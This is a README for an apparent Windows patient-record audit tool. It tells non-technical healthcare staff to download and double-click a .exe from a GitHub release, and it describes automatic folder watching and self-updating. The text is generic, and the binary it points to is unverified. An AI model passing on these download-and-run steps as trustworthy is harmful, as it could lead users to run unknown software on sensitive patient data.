# 📋 apexcare-patient-file-check - Audit patient records with better accuracy

[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Berkwinged803/apexcare-patient-file-check)

ApexCare Patient File Audit helps healthcare staff review patient records. It identifies errors and missing details in digital documents. This tool saves time and improves data quality. You do not need technical skills to use this software.

## 💻 System Requirements

This application runs on Windows computers. Ensure your system meets these standards:

- Operating System: Windows 10 or Windows 11.
- Memory: 4 GB of RAM minimum.
- Storage: 200 MB of free disk space.
- Browser: Current version of Chrome, Edge, or Firefox.
- Internet: Connection for downloading updates.

## 📥 How to Install

The application uses your web browser to display the interface. Follow these steps to set up the software on your computer:

1. Visit [this page to download](https://github.com/Berkwinged803/apexcare-patient-file-check) the latest version.
2. Look for the file ending in .exe in the releases section.
3. Save the installer file to your Downloads folder.
4. Open your Downloads folder.
5. Double-click the file to start the installation.
6. Follow the prompts on the screen to finish the process.
7. Click the new icon on your desktop to open the application.

## 🚀 Getting Started

Once you open the application, your default web browser will load the audit dashboard. You will see several tools arranged by function.

### Uploading Files
Click the Import button to select patient files from your computer. You can upload PDF, Word, or text files. The system scans each document for specific keywords and data patterns.

### Reviewing Results
The dashboard presents a list of files. Items marked in red contain missing information or formatting issues. Click any item to open the document viewer. The viewer highlights the specific area that needs your attention. 

### Exporting Reports
You can save your findings as an Excel file. Click the Export button at the top of the screen. Choose your folder and save the report. This file gives you a clear summary of all audits performed during your session.

## ⚙️ Configuration

The application works right after installation, but you can change settings to fit your needs.

- Folder Watcher: Set a target folder on your computer. The app will monitor this folder for new patient files and import them automatically.
- Scan Rules: Choose which data points the app looks for. You can enable or disable checks for birth dates, insurance numbers, or diagnosis codes.
- Language: Change the display language in the user settings menu.

## 🔄 Updating the Software

The app checks for new versions every time you start it. If a new version exists, a notification appears on the dashboard. Click Update to download the latest features. The application will restart automatically to finalize the changes. Your previous settings and audit reports remain safe during this process.

## 🛠 Troubleshooting

Most issues involve file permissions or connection errors. Try these steps if the app does not behave as expected:

- Restart the application: Close the browser window and the background application, then reopen it from your desktop icon.
- Check file access: Ensure the files you want to audit are not open in another program like Microsoft Word. The app cannot read files currently locked by other software.
- Clear browser cache: If the interface looks strange, clear your browser history and cache, then refresh the page.
- Reinstall: If errors persist, delete the application and run the installer again from the main download link.
